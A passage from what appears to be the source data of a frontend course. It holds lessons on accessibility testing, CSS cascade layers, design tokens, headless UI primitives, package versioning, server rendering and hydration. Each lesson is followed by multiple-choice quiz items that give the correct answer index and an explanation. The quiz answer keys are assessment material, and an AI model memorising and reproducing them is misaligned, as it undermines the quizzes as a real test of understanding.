### Accessibility gates that name the problem

\`\`\`ts
import AxeBuilder from '@axe-core/playwright';

for (const path of ['/', '/courses', '/cart', '/checkout']) {
  test(\`no axe violations on \${path}\`, async ({ page }) => {
    await page.goto(path);
    const { violations } = await new AxeBuilder({ page })
      .withTags(['wcag2a', 'wcag2aa'])
      .analyze();

    expect(violations.map((v) => \`\${v.id} (\${v.nodes.length})\`)).toEqual([]);
  });
}
\`\`\`

Asserting on mapped strings rather than \`toHaveLength(0)\` is the detail that makes this usable. The failure reads \`color-contrast (4), label (1)\` instead of dumping nine hundred lines of nested objects that nobody reads past line ten.

Inheriting an app with 137 violations? Do not fail the build on all of them, because the gate gets disabled by Friday. Ratchet instead: commit a baseline of known violation ids per route, fail only on ids that are not in it, and delete entries as they are fixed.

\`\`\`json
{ "/courses": ["color-contrast"], "/checkout": ["label", "aria-required-attr"] }
\`\`\`

### Automate the keyboard, because axe cannot see it

Chapter 5 put the automated share at roughly a third of real problems. Focus order, focus trapping and whether Escape works are invisible to a static scan, and they are ordinary Playwright assertions:

\`\`\`ts
await page.getByRole('button', { name: 'Filters' }).click();
const dialog = page.getByRole('dialog', { name: 'Filters' });
await expect(dialog.getByRole('button', { name: 'Close' })).toBeFocused();

await page.keyboard.press('Escape');
await expect(dialog).toBeHidden();
await expect(page.getByRole('button', { name: 'Filters' })).toBeFocused();
\`\`\`

That last assertion is the one people leave out, and it is the one that catches the regression users feel: the dialog closes and focus falls back to the top of the document, so the next Tab starts from the skip link instead of the button they just pressed.
      `,
        [
          q('Visual baselines captured on a developer laptop fail in Linux CI even though no CSS changed. Why?', [
            'Font hinting and antialiasing differ between the two platforms',
            'Playwright saves baselines with a platform-specific colour profile',
            'The container always renders at a different device pixel ratio',
            'CSS animations are disabled during screenshots on macOS only',
          ], 0, 'Text rendering is not identical across operating systems, so a text-heavy component differs by a few percent before anyone touches a stylesheet.'),
          q('Why assert on the mapped violation ids rather than on the length of the axe violations array?', [
            'Mapping lets axe skip rules that are already known to fail',
            'toHaveLength cannot be used on the array that axe returns',
            'The failure then names the rules instead of dumping huge objects',
            'Mapping avoids a deep comparison, so the assertion runs faster',
          ], 2, 'A readable failure such as "color-contrast (4)" gets fixed, while a wall of nested node objects gets skimmed and eventually ignored.'),
          q('A dialog closes on Escape and axe reports zero violations. Which regression can still reach users?', [
            'The dialog is missing an accessible name for screen readers',
            'Focus lands back at the top of the document, not on the trigger',
            'The close button has too little contrast against the backdrop',
            'The dialog element is missing the role attribute it requires',
          ], 1, 'A static scan reads the markup at one instant and cannot observe where focus travels, so returning focus to the button that opened the dialog needs its own assertion.'),
        ]
      ),
      ],
      [
      q('A team adds forty end-to-end tests, one per form validation message. What is the predictable result?', [
        'Coverage rises, and the pipeline finds bugs earlier than before',
        'Strict mode violations start appearing across the whole suite',
        'Visual baselines drift, because more screens are now captured',
        'The build turns slow and flaky, for checks a component test covers',
      ], 3, 'Validation branches run in milliseconds one level down, so moving them into a real browser multiplies runtime and timing exposure without adding new information.'),
      q('Which statement honestly describes what an automated accessibility gate can promise?', [
        'axe finds the machine-checkable share, so keyboard paths need assertions',
        'axe plus screenshot diffs together cover essentially every issue',
        'Screenshot diffs catch focus bugs, so axe only adds colour contrast',
        'A clean axe run means the page meets WCAG AA for every user',
      ], 0, 'Static scanning covers roughly a third of real problems, so focus order, focus trapping and Escape behaviour still need explicit tests written by a person.'),
      q('CI has marked one test flaky after passing on retry for four weeks running. What does the chapter recommend?', [
        'Raise the timeout for that test until it stops needing a retry',
        'Increase retries to three so the report stops flagging it',
        'Diagnose it or quarantine it, because retries only measure flake',
        'Remove the assertion that fails most often and keep the rest',
      ], 2, 'A test that only passes on retry is reporting a real race that users can hit, so it needs a diagnosis or an explicit quarantine rather than a bigger shock absorber.'),
      q('Forty specs each sign in through the login form. Beyond the wasted minutes, what is the real cost?', [
        'The login form ends up with no coverage anywhere in the suite',
        'One broken login turns forty failures into a single unclear signal',
        'Session cookies accumulate until they exceed the header size limit',
        'Playwright cannot run those specs in parallel across its workers',
      ], 1, 'When every spec depends on the same flow, a failure there lights up the whole report and hides which behaviour actually regressed.'),
      ]
    ),
    chapter(
      'Design Systems and Component Libraries',
      'Turning one team\'s components into a styling architecture, accessible primitives, and a versioned package other teams can safely depend on.',
      [
      lesson('Styling Architecture and the Cascade at Scale', 13, `
A checkout button in a 90,000 line stylesheet needed this selector to turn green:

\`\`\`css
body.checkout #main .panel .toolbar button.btn.btn-primary {
  background: #16a34a !important;
}
\`\`\`

Nobody wrote that in one sitting. It accreted over two years, one \`!important\` at a time, because each person only needed to beat the person before them. The stylesheet was not badly written. It was written without an architecture.

### Specificity is a tuple, not a score

The browser compares three numbers in order: ids, then classes and attributes and pseudo-classes, then elements. \`#main .panel button\` is \`(1, 1, 1)\`. A thousand class selectors, \`(0, 1000, 0)\`, still lose to one id. That is why a single \`#main\` in a layout file poisons everything underneath it.

Two rules follow. Keep selectors flat, ideally one class, \`(0, 1, 0)\`. And when you write a base style that anyone should be able to override, wrap it in \`:where()\`, which contributes zero specificity:

\`\`\`css
:where(.prose) :where(h2, h3) { margin-block-start: 1.5em; }
\`\`\`

That rule now loses to any single class an application writes, which is exactly what you want from a system default.

### Cascade layers end the arms race

\`@layer\` beats specificity outright. An id selector in an earlier layer loses to a lone class in a later one.

\`\`\`css
@layer reset, base, components, utilities, overrides;

@layer components {
  #checkout .btn-primary { background: #2563eb; }   /* (1,2,0) */
}
@layer utilities {
  .bg-success { background: #16a34a; }              /* (0,1,0), wins */
}
\`\`\`

Declare the order once, at the top, before any layer has content. That single line is the whole contract: the design system ships into \`components\`, applications override in \`overrides\`, and nobody needs \`!important\` again. The part that surprises people is the fallback rule. Unlayered styles beat every layer, which is the opposite of what most developers guess, so a stray global stylesheet outranks your carefully ordered stack.

### Pick one scoping strategy

| Approach | Scoping mechanism | Cost that shows up at scale |
|---|---|---|
| Global CSS plus BEM | Naming discipline | Nothing enforces the discipline |
| CSS Modules | Compiler hashes class names | Dynamic values need custom properties |
| Runtime CSS in JS | Styles generated during render | Per render cost, ordering surprises |
| Zero runtime CSS in JS | Extracted at build time | Only statically analysable values |
| Utility CSS | Atomic classes, no authoring | Long class lists, config becomes the API |

The row people underestimate is runtime CSS in JS. Libraries like styled-components and emotion serialise your template literal, hash it, and insert a rule into a \`<style>\` tag the first time that component renders. Insertion order therefore follows mount order. Two rules of equal specificity resolve differently depending on which component mounted first, so the bug appears only for a user who lands on a deep link instead of navigating there. Server rendering makes it worse: styles must be collected during render, which is the exact thing that blocks streaming HTML.

### Let consumers in

The broken version:

\`\`\`jsx
export function Badge({ children }) {
  return <span className="badge">{children}</span>;
}
\`\`\`

Any consumer needing a variant now forks it or fights it with a descendant selector. The fixed version merges:

\`\`\`jsx
import { clsx } from 'clsx';

export function Badge({ className, ...rest }) {
  return <span className={clsx('badge', className)} {...rest} />;
}
\`\`\`

One trap here. The order of names inside the \`class\` attribute means nothing to the cascade, so \`clsx('badge', className)\` does not make the consumer win. What decides the winner is where the rules sit in the stylesheet, which is why the layer declaration above is doing the real work.

### The rule to hold

One class per component, specificity at \`(0, 1, 0)\`, system in a low layer, applications in a high one. When a teammate reaches for \`!important\`, treat it as a bug report about your layer order rather than as a fix.
      `,
        [
          q('A design system ships button styles in `@layer components` using the selector `#app .btn`. An application writes `.btn-danger { background: red }` in `@layer overrides`. Which declaration wins?', [
            'The system rule, because an id selector outranks a single class',
            'Neither reliably, because layer order follows stylesheet load order',
            'The application rule, because a later layer beats any specificity in an earlier layer',
            'The system rule, because layers only reorder rules of equal specificity',
          ], 2, 'Cascade layers are compared before specificity, so a single class in a later layer defeats an id selector declared in an earlier one.'),
          q('Two components styled with a runtime CSS in JS library have selectors of identical specificity. Why can the same page look different depending on how a user arrived at it?', [
            'Rules are inserted when a component first renders, so mount order sets cascade order',
            'The library recomputes specificity on each navigation and picks a fresh winner',
            'Hashed class names are regenerated per route, changing which rule matches',
            'The browser sorts stylesheet rules alphabetically once a document gets large',
          ], 0, 'Runtime libraries insert a rule the first time a component renders, so a deep link that mounts the components in the opposite order produces the opposite cascade result.'),
          q('Why does wrapping a library\'s base selectors in `:where()` make them easier for an application to override?', [
            'It scopes those rules to the nearest shadow root, hiding them from the page',
            'It defers the rules until every other stylesheet has finished parsing',
            'It flags the declarations as low priority, like a reversed !important',
            'It contributes zero specificity, so any single class selector outranks it',
          ], 3, 'The `:where()` pseudo-class matches its argument but adds nothing to the specificity tuple, leaving the rule at (0, 0, 0) so a plain class beats it.'),
        ]
      ),
      lesson('Design Tokens, Theming, and Dark Mode', 13, `
A team ran a script over their stylesheets and found 47 distinct greys, twelve of which differed from a neighbour by a single hex digit. None of that was a decision. It was two years of people eyedropping screenshots. When the dark mode ticket arrived, the estimate came back at six weeks, and the estimate was correct, because all 47 greys had to be found and reasoned about one at a time.

Tokens are how you stop that happening twice.

### Three tiers, and only the middle one gets themed

| Tier | Example | Who is allowed to read it |
|---|---|---|
| Primitive | \`--blue-600: #2563eb\` | Only the semantic tier |
| Semantic | \`--color-action: var(--blue-600)\` | Every component |
| Component | \`--button-bg: var(--color-action)\` | One component |

A primitive says what a colour is. A semantic token says what it is for: \`--color-surface\`, \`--color-text-muted\`, \`--color-border-strong\`, \`--color-danger\`. Components never mention \`--blue-600\`, and that single restriction is what turns theming into a config change instead of a migration.

Now the mistake almost everyone makes first. They theme the primitives:

\`\`\`css
:root { --grey-100: #f4f4f5; }
[data-theme='dark'] { --grey-100: #27272a; }   /* grey-100 is now dark */
\`\`\`

The name is a lie in one of the two themes. Every component that grabbed \`--grey-100\` because it wanted a light background is correct only by accident, and the day someone uses it for a border, dark mode breaks. Theme the semantic layer instead:

\`\`\`css
:root {
  --grey-100: #f4f4f5;
  --grey-900: #18181b;
  --color-surface: var(--grey-100);
  --color-text: var(--grey-900);
  color-scheme: light;
}
:root[data-theme='dark'] {
  --color-surface: var(--grey-900);
  --color-text: var(--grey-100);
  color-scheme: dark;
}
\`\`\`

\`color-scheme\` is not decoration. It tells the browser to paint scrollbars, form controls, the caret and default focus rings in the matching palette. Leave it out and your dark page keeps a bright white scrollbar down the side.

### The flash everyone ships once

\`\`\`html
<script>
  try {
    var saved = localStorage.getItem('theme') || 'system';
    var dark = saved === 'dark' || (saved === 'system' &&
      matchMedia('(prefers-color-scheme: dark)').matches);
    document.documentElement.dataset.theme = dark ? 'dark' : 'light';
  } catch (e) {}
</script>
\`\`\`

That goes in \`<head>\`, synchronous, before any stylesheet, with no \`defer\` and no bundler involvement. Set the theme in a \`useEffect\` instead and it runs after the first paint, so a dark mode user gets a full white frame in the face on every navigation to a fresh document. The \`try\` block matters because \`localStorage\` throws outright in some privacy modes.

### Custom properties resolve at use time

Change \`--color-surface\` on \`<html>\` and every element reading it repaints. No React re-render, no context update, no props change anywhere. That is why a theme toggle that flips one attribute beats a theme stored in state.

Two limits catch people:

- A custom property cannot be used in a media query condition. \`@media (min-width: var(--bp-md))\` never matches. Breakpoints stay literal or come from the build step.
- Transitioning a variable is a no-op unless you register its type first: \`@property --color-surface { syntax: '<color>'; inherits: true; initial-value: #ffffff; }\`

### One source of truth, many outputs

Keep tokens in a \`tokens.json\` that a tool such as Style Dictionary compiles into \`tokens.css\`, a typed \`tokens.ts\`, and whatever iOS and Android need. Designers edit one file, sometimes exported straight from Figma variables, and one diff moves every platform.

Then gate it. A CI check that walks every semantic text and surface pair and asserts 4.5:1 contrast in both themes catches the regression that a screenshot review will not. And remember that a dark theme is not an inversion: elevation is expressed with lighter surfaces rather than shadows, because a shadow on near black is invisible.
      `,
        [
          q('A team redefines `--grey-100` as `#27272a` under `[data-theme=\'dark\']`. What goes wrong with that over time?', [
            'Custom properties cannot be redefined on a descendant selector, so it is ignored',
            'The token name no longer describes its value, so new uses of it break a theme',
            'Dark mode repaints get slower, because the primitive tier must be invalidated',
            'The cascade resolves primitives before themes, so the light value always wins',
          ], 1, 'Theming a primitive makes its name false in one theme, so the next developer who picks it for a border or a shadow silently ships a broken dark mode.'),
          q('Why must the script that reads a saved theme run synchronously in `<head>` instead of inside a `useEffect`?', [
            'useEffect cannot reach localStorage, because it runs before hydration finishes',
            'Custom properties must be declared before the stylesheet consuming them parses',
            'React strips data attributes from `<html>` on hydration unless they are inline',
            'An effect runs after the first paint, so the user sees the wrong theme flash',
          ], 3, 'Effects fire after React commits and the browser paints, so a dark mode user gets one full white frame before the attribute is corrected.'),
          q('You define `--bp-md: 768px` on `:root` and then write `@media (min-width: var(--bp-md))`. What happens?', [
            'The query never matches, because custom properties are invalid in query conditions',
            'It matches at 768px, because properties on `:root` are global to the document',
            'It matches, but only after the first paint resolves the variable on `<html>`',
            'It raises a parse error that invalidates the rest of the stylesheet',
          ], 0, 'Media query conditions are evaluated before custom properties are substituted, so the condition is invalid and the block never applies at any width.'),
        ]
      ),
      lesson('Headless Primitives: Dialogs, Menus, and Comboboxes', 13, `
Open the WAI-ARIA Authoring Practices page for a combobox and count the keyboard interactions it specifies. Down, Up, Home, End, Enter, Escape, Tab, Alt with Down, Alt with Up, printable characters for typeahead, plus rules for what \`aria-activedescendant\` points at in each of those cases. The dropdown in your codebase handles click, and maybe Escape. That is the gap.

Headless primitives exist because closing that gap is not a styling problem and is not worth solving twice.

### What headless actually means

A headless component ships behaviour, keyboard handling, focus management and ARIA wiring, with no opinion about how any of it looks. Radix, React Aria, Headless UI and Downshift all take this shape. You get the hard part and you keep the design.

State arrives as data attributes, so styling stays in CSS:

\`\`\`jsx
<Dialog.Content className="modal">
  <Dialog.Title className="modal-title">Delete project</Dialog.Title>
  <Dialog.Close asChild>
    <button className="btn-ghost">Cancel</button>
  </Dialog.Close>
</Dialog.Content>
\`\`\`

\`\`\`css
.modal[data-state='open'] { animation: fade-in 150ms ease-out; }
\`\`\`

\`asChild\` merges the primitive's props and ref onto your element instead of wrapping it in another \`div\`. That is also why every primitive forwards refs: the library has to focus, measure and observe the node you supplied.

### A dialog is four jobs, and three are not about the dialog

Focus moves in on open. Focus returns to the trigger on close, not to \`<body>\`. Escape closes it. And the rest of the page has to stop existing, both for Tab and for assistive technology.

That last job is where hand-rolled modals fail. A focus trap that only cycles Tab still leaves the background reachable to a screen reader's virtual cursor, which happily reads straight through your overlay. The fix is \`inert\` on the sibling content, or \`aria-hidden\` applied and removed as a pair.

Then the layout bug nobody predicts. Locking scroll with \`overflow: hidden\` on \`<body>\` removes the scrollbar, the viewport gains about 15 pixels, and the whole page jumps sideways behind the overlay. Set \`scrollbar-gutter: stable\` on \`<html>\` once and it stops forever.

Portals carry their own surprise. A dialog rendered with \`createPortal\` lands at the end of \`<body>\` in the DOM but stays exactly where it was in the React tree. Context still reaches it, and events still bubble to its React parent rather than its DOM parent. So a portalled dialog inside a \`<form>\` will submit that form when a plain button inside it is clicked.

### Menus and comboboxes manage focus differently

| Pattern | Where DOM focus sits | How the active item is marked |
|---|---|---|
| Menu, listbox, tabs | On the active item itself | \`tabIndex\` 0 on it, -1 on the rest |
| Combobox | Stays in the text input | \`aria-activedescendant\` names the option |

Roving tabindex makes the whole widget a single Tab stop, with arrows moving inside it. Skip it and a 200 item menu becomes 200 Tab stops, which is how a keyboard user ends up trapped for a minute in your country picker.

A combobox cannot use roving tabindex, because moving focus out of the input stops typing and dismisses the mobile keyboard. Focus stays put and a pointer does the announcing:

\`\`\`jsx
<input
  role="combobox"
  aria-expanded={open}
  aria-controls="city-listbox"
  aria-autocomplete="list"
  aria-activedescendant={open ? \`city-opt-\${active}\` : undefined}
/>
<ul id="city-listbox" role="listbox">
  <li id="city-opt-0" role="option" aria-selected={active === 0}>Lahore</li>
</ul>
\`\`\`

Drop \`aria-activedescendant\` and a screen reader user hears silence while arrowing down the list. On screen everything still looks perfect, which is why this ships.

### When to build it yourself

Native \`<dialog>\` with \`showModal()\` covers a simple modal, and \`<details>\` covers a disclosure. Both are fine to own. Reach for a library the moment a widget has a collection in it: menu, listbox, combobox, tabs, tree. Those are the ones where the specification is long, the failures are invisible, and your users cannot file the bug.
      `,
        [
          q('A dialog is rendered inside a `<form>` and portalled to the end of `<body>`. Clicking a plain `<button>` inside the dialog submits the form. Why?', [
            'Portals copy the nearest form element\'s submit handler onto their root node',
            'The overlay element inherits the form\'s implicit submission behaviour',
            'Events propagate through the React tree, not the DOM tree, so they reach the form',
            'React moves portalled nodes back inside the form during the commit phase',
          ], 2, 'React routes synthetic events along its own component tree, so a portalled node still bubbles into the React parent that rendered it, form included.'),
          q('Why does the combobox pattern use `aria-activedescendant` rather than moving DOM focus onto each option?', [
            'Listbox options cannot receive DOM focus at all without a tabIndex attribute',
            'Focus has to stay in the input so typing works and the mobile keyboard stays up',
            'Screen readers ignore focus changes that occur inside an expanded popup',
            'Moving focus would turn every option into a separate stop in the tab order',
          ], 1, 'Taking focus off the text input would stop keystrokes reaching it and dismiss the on-screen keyboard, so the active option is named by id instead.'),
          q('A hand-rolled modal cycles Tab correctly inside itself, yet a screen reader still reads the page behind it. What is missing?', [
            'A `tabindex=\'-1\'` on the overlay, which a virtual cursor respects',
            'A higher z-index, so the background paints underneath the overlay',
            'A `role=\'dialog\'` on the content, which scopes announcements to it',
            '`inert` or `aria-hidden` on the background, since a virtual cursor ignores tab order',
          ], 3, 'A screen reader\'s virtual cursor walks the accessibility tree rather than the tab order, so the background must be removed from that tree as well as from Tab.'),
        ]
      ),
      lesson('Publishing, Versioning, and Driving Adoption', 13, `
A team shipped \`@acme/ui@1.4.2\`. The only change was the default button padding, 8px to 12px, because a design review asked for it. Semver called it a patch, so fourteen applications picked it up overnight on their next install, and eleven of them had toolbars that now wrapped onto two lines. The release note said "visual polish".

CSS is API. The rest of this rests on that sentence.

### The package.json that decides everything

\`\`\`json
{
  "name": "@acme/ui",
  "version": "1.4.2",
  "type": "module",
  "sideEffects": ["*.css"],
  "exports": {
    ".": { "types": "./dist/index.d.ts", "import": "./dist/index.js" },
    "./styles.css": "./dist/styles.css"
  },
  "peerDependencies": { "react": "^18 || ^19" }
}
\`\`\`

Four things there are load bearing.

React goes in \`peerDependencies\`, never \`dependencies\`. Get it wrong and a consumer can install a second copy, which produces the invalid hook call error that costs somebody an afternoon before they think to run \`npm ls react\`.

\`exports\` is a wall, not a hint. Once it exists, \`import { Button } from '@acme/ui/dist/Button'\` fails, and that is the point: anything unlisted is private and you are free to move it.

\`"types"\` must be the first key inside each condition object. Resolution takes the first match, so a \`types\` key written after \`import\` is silently skipped and consumers get \`any\` with no error anywhere.

\`sideEffects: false\` lets bundlers drop unused modules, and it will cheerfully drop your stylesheet too, because a bare \`import './styles.css'\` looks exactly like a module whose exports nobody uses. Listing \`"*.css"\` is the fix.

### What counts as breaking

| Change | Bump |
|---|---|
| Adding an optional prop | minor |
| Renaming an existing prop | major |
| Changing a default spacing or colour | major, if visuals are public |
| Changing the rendered DOM structure | major, consumers select on it |
| Fixing a focus or keyboard bug | patch |
| Adding a new semantic token | minor |

Pick a line and publish it. Either "our rendered markup and visual defaults are public API" or "they are not, style us only through documented props and tokens". Both positions are defensible. Silence is not, because consumers assume the first and maintainers assume the second.

### Release mechanics

Every pull request that changes behaviour carries a changeset, a small markdown file naming the bump and the human sentence:

\`\`\`markdown
---
'@acme/ui': minor
---

Button accepts a \`loading\` prop that renders a spinner and sets \`aria-busy\`.
\`\`\`

CI collects those into a version pull request and publishes on merge, so nobody hand edits a version number or writes a changelog from git log. Publish a prerelease from every pull request as well, something like \`@acme/ui@0.0.0-pr-482-a1b2c3\`, so an application can install the change and look at it before it is real.

### Deprecate, do not delete

Ship the replacement, keep the old path working, warn once in development, and ship the codemod in the same release:

\`\`\`jsx
if (process.env.NODE_ENV !== 'production' && variant === 'cta') {
  console.warn(
    '[acme/ui] Button variant="cta" is deprecated, use variant="primary". ' +
    'Run: npx @acme/ui-codemod button-cta'
  );
}
\`\`\`

Two minor releases of overlap, then remove in the next major. A deprecation warning without a codemod is homework you assigned to fourteen teams who did not ask for it.

### Adoption is measured, not announced

Announcements do not move numbers. Run a scanner across every repo counting raw \`<button\` against imported \`<Button\`, publish the percentage per application weekly, and watch which teams stall. Then go and ask them why, because the answer is almost always a missing variant or a prop you refused to add. An escape hatch such as an accepted \`className\` beats a fork every time, and a fork is what you get instead.
      `,
        [
          q('A component library sets `sideEffects: false` and consumers report that all of its styling has vanished. What happened?', [
            'The bundler treated the bare CSS import as unused and removed the module',
            'The `exports` map stopped resolving the stylesheet path during the build',
            'CSS was inlined into the ESM output, which consumers no longer parse',
            'The flag disabled the library\'s own PostCSS step at publish time',
          ], 0, 'A bare `import \'./styles.css\'` has no used exports, so declaring the whole package side effect free lets tree shaking delete the stylesheet entirely.'),
          q('Why does listing `react` under `dependencies` instead of `peerDependencies` tend to cause an invalid hook call?', [
            'React refuses to load unless it is a direct dependency of the application',
            'Hooks are stripped out of any library that bundles its own copy of React',
            'The install can produce two copies of React, each with its own dispatcher',
            'Peer dependencies are the only ones a package manager may deduplicate',
          ], 2, 'Two React instances means the library\'s hooks call a different internal dispatcher from the one the application rendered with, which React reports as an invalid hook call.'),
          q('Under a policy that visual defaults are public API, what release should a change of default button padding from 8px to 12px get?', [
            'Patch, since no prop, type or exported name changed in the package',
            'Major, since consumer layouts depend on the default and can break',
            'Minor, since it adds capability without removing anything existing',
            'No bump, since stylesheets ship outside the versioned package',
          ], 1, 'If the rendered look is declared part of the contract then changing it can break consumer layouts, which is precisely what a major version exists to signal.'),
        ]
      ),
      ],
      [
      q('Which pair of decisions removes the need for `!important` in applications consuming a design system?', [
        'Hashed class names from CSS Modules plus a deep global reset',
        'Id based selectors in the system plus utility classes in apps',
        'Runtime CSS in JS plus alphabetical ordering of component files',
        'A declared `@layer` order plus flat single class selectors',
      ], 3, 'Layers decide the winner before specificity is consulted, and flat selectors keep the system from outranking itself, so an application override always lands.'),
      q('A component reads `--blue-600` directly for its background. What does that cost the design system?', [
        'Themes can no longer be swapped without editing that component',
        'The property stops inheriting once a theme attribute is present',
        'Specificity of the component rule rises by one class selector',
        'The build step can no longer tree shake unused primitive tokens',
      ], 0, 'Primitives are not themed, so a component bound to one is pinned to a single palette and must be rewritten rather than reconfigured for a second theme.'),
      q('What is the strongest reason to take a dialog and a combobox from a headless library rather than writing them?', [
        'Headless libraries render faster because they bypass the virtual DOM',
        'Focus management, keyboard patterns and ARIA wiring are the expensive part',
        'Their default styles already match most design systems with small edits',
        'They remove any need to forward refs or accept a className prop',
      ], 1, 'The visual layer is the cheap part of these widgets, while the specified keyboard and focus behaviour is long, subtle, and invisible when it is wrong.'),
      q('A system removes the deprecated `variant=\'cta\'` in the same release that introduces its replacement. Why is that a problem?', [
        'Semver forbids adding and removing an option in one major version',
        'The deprecation warning cannot fire once the old value is gone',
        'Consumers get no overlap window in which both values work',
        'Codemods may only be published from a minor release, not a major',
      ], 2, 'Without a release where old and new both work, every consuming application has to change on the same day, which is what stalls upgrades across a fleet.'),
      ]
    ),
    chapter(
      'Server Rendering and Streaming',
      'Moving rendering to the server, surviving hydration, and streaming a page that is useful long before all of its data has arrived.',
      [
      lesson('Why Render on the Server, and When Not To', 14, `
A pricing page ships 240 KB of compressed JavaScript. On a mid-range Android over Slow 4G the browser receives an empty \`<div id="root">\` at 190 ms, finishes downloading and parsing the bundle at 3.4 s, then fires \`/api/plans\` and paints prices at 4.1 s. Render that same page on the server and the first byte arrives at 320 ms with the prices already in the markup. LCP lands at 1.3 s.

You paid 130 ms of TTFB and bought back 2.8 seconds of paint. That trade, and the routes where it runs the other way, is the whole decision.

### Collapse the waterfall, do not just move it

\`\`\`text
Client rendered
  HTML 40ms -> bundle 1.9s -> parse+execute 1.2s -> fetch plans 400ms -> paint 4.1s

Server rendered
  HTML with data 320ms -> paint 1.3s -> bundle -> hydrate -> interactive 3.6s
\`\`\`

Stare at the second line. First paint moved forward by seconds. **Interactive barely moved at all.** The bundle still downloads, still parses, still hydrates. Server rendering buys first paint and crawlable HTML, not a cheaper client. If your complaint is INP, the fix is still shipping less JavaScript (Chapter 4), not moving the render.

| Strategy | Rendered when | Fits | Cost |
|---|---|---|---|
| CSR | In the browser, every visit | Screens behind a login | Blank first paint, no SEO |
| SSR | On the server, every request | Fresh or personalised pages | CPU and TTFB per request |
| SSG | Once, at build time | Docs, marketing, blog posts | Rebuild to change a word |
| ISR | At build, refreshed on a timer | Catalogues that shift hourly | Serving stale data by design |

Real applications mix all four in one deployment. \`/pricing\` static, \`/courses/:slug\` regenerated every 10 minutes, \`/account\` pure client rendering because it is private anyway.

### Work you move to the server lands on your bill

\`renderToString\` is synchronous. It blocks the Node event loop for the entire render:

\`\`\`js
app.get('/courses/:slug', async (req, res) => {
  const course = await db.courses.findBySlug(req.params.slug); // 180 ms
  const html = renderToString(<App course={course} />);        // 12 ms, blocking
  res.send(shell(html));
});
\`\`\`

12 ms sounds free until you do the arithmetic. One Node process manages roughly 83 renders per second before the event loop itself is the ceiling, and that is before the 180 ms query. At 400 requests per second you are paying for six processes to produce markup a CDN could have cached. Route-level caching and streaming are the answers, not a larger instance.

The subtler cost: your components now execute where there is no \`window\`, no \`document\`, no \`localStorage\`.

\`\`\`jsx
const isWide = window.innerWidth > 900;
// ReferenceError: window is not defined
\`\`\`

Every third-party widget you pull in has to survive that too, and plenty do not.

### When not to bother

Skip server rendering when the page sits behind a login and no crawler will ever see it, when the content is so personalised that nothing caches, or when interaction is the product. A spreadsheet editor, a map, a video timeline: these paint a shell and then live entirely in the browser. Routing them through SSR adds latency and a hydration surface for no gain.

Skip it when your data is slow, too. Server rendering converts a spinner into a stall. A 700 ms recommendations call that used to fill in after paint now holds the first byte for 700 ms, and the visitor watches a white tab with no feedback whatsoever. Fetch that on the client, or stream it.

### The mistake to avoid

Switching SSR on across the whole application because it is "faster", then measuring nothing. Compare LCP and TTFB per route against real field data (Chapter 6), on a throttled device. Several routes will improve dramatically. At least one will get worse, and you want to find that one before your users do.
      `,
        [
          q('A team moves a marketing route from client rendering to SSR. LCP improves by 2.8 seconds, but INP does not move at all. Why?', [
            'SSR defers all event handlers until the browser reports idle',
            'INP is only recorded on routes that were statically generated',
            'The same bundle still downloads, parses and hydrates in the browser',
            'Server markup lets React skip its reconciliation pass entirely',
          ], 2, 'Server rendering changes when the first paint happens, not how much JavaScript ships, so interaction latency is still governed by the bundle you send.'),
          q('Your SSR handler calls renderToString and each render costs 12 ms. What is the practical ceiling for one Node process, and why?', [
            'About 83 renders per second, because the call blocks the event loop',
            'Unlimited, because renderToString runs on the worker thread pool',
            'About 12 per second, since each render also awaits the database',
            'Roughly 1000, because Node parallelises synchronous React renders',
          ], 0, 'renderToString is synchronous, so 12 ms of blocking work per request leaves a single process roughly 83 renders of headroom every second before the event loop becomes the bottleneck.'),
          q('Which of these routes is the weakest candidate for server rendering?', [
            'A public course catalogue that search engines need to index',
            'A pricing page whose content is identical for every visitor',
            'A blog article that changes only when an editor publishes it',
            'A collaborative spreadsheet editor sitting behind a login wall',
          ], 3, 'An editor is private, invisible to crawlers and almost entirely interactive, so server rendering adds latency and a hydration surface without improving anything a user perceives.'),
        ]
      ),
      lesson('Hydration and the Mismatch Bugs', 14, `
\`Text content did not match. Server: "14:32" Client: "14:33"\`

One minute of clock drift between the render and the load, and React throws away the entire root, re-renders it in the browser, and hands you exactly the blank-then-paint waterfall you moved to the server to escape. The page still works. It just cost more than plain client rendering would have.

### Hydration is an assertion, not a render

The server already sent HTML. React does not rebuild that DOM. It walks the existing nodes alongside a fresh render of your tree and claims each one: attaching listeners, wiring refs, building the fiber tree that later renders diff against. The DOM is the fact, your render is the expectation, and hydration asserts they agree.

When they disagree, React abandons hydration for that boundary and client renders the subtree from scratch. React 19 prints a readable diff of the offending element; React 18 gives you the terse warning above and leaves you hunting.

| Cause | Looks like | Fix |
|---|---|---|
| Time | \`new Date().toLocaleTimeString()\` | Send an ISO string, format in an effect |
| Randomness | \`Math.random()\` in an id | \`useId\` from Chapter 2 |
| Browser APIs | \`localStorage\`, \`window.innerWidth\` | Two-pass render or a server snapshot |
| Locale or zone | Server in UTC, reader in Karachi | Pass locale and offset as props |
| Invalid nesting | \`<div>\` inside \`<p>\` | Fix the markup |

That last row surprises people, because nothing in the JSX looks wrong:

\`\`\`jsx
<p>Enrolled: <div className="badge">Active</div></p>
\`\`\`

The HTML parser is not allowed to put a \`<div>\` inside a \`<p>\`, so it closes the paragraph early and the badge becomes a *sibling*. React expected a child. Every hydration attempt on that subtree fails, and the string never appears in your source.

### Broken, then fixed

\`\`\`jsx
// BROKEN: the server has no localStorage, so render one disagrees
function ThemeToggle() {
  const [theme, setTheme] = useState(localStorage.getItem('theme') ?? 'light');
  return <button onClick={() => setTheme(t => t === 'dark' ? 'light' : 'dark')}>{theme}</button>;
}

// FIXED: first client render matches the server, then correct it
function ThemeToggle() {
  const [theme, setTheme] = useState('light');
  useEffect(() => {
    const saved = localStorage.getItem('theme');
    if (saved) setTheme(saved);
  }, []);
  return <button onClick={() => setTheme(t => t === 'dark' ? 'light' : 'dark')}>{theme}</button>;
}
\`\`\`

The markup now agrees, but a dark-mode reader sees a white flash before the effect runs. The cure is a blocking script in \`<head>\` that stamps an attribute on \`<html>\` before the body paints:

\`\`\`html
<script>
  document.documentElement.dataset.theme = localStorage.getItem('theme') || 'light';
</script>
\`\`\`

CSS handles appearance, React handles the toggle, and because the attribute is set outside React's tree there is nothing to mismatch.

### Two escape hatches, used precisely

\`suppressHydrationWarning\` silences the difference for one element's text and attributes, one level deep. It does not repair the content, it only stops the complaint.

\`\`\`jsx
<time dateTime={iso} suppressHydrationWarning>{formatted}</time>
\`\`\`

Reach for it when the values are genuinely allowed to differ, like a formatted timestamp. Reach for it to quiet a mismatch you have not diagnosed and you have buried a real bug.

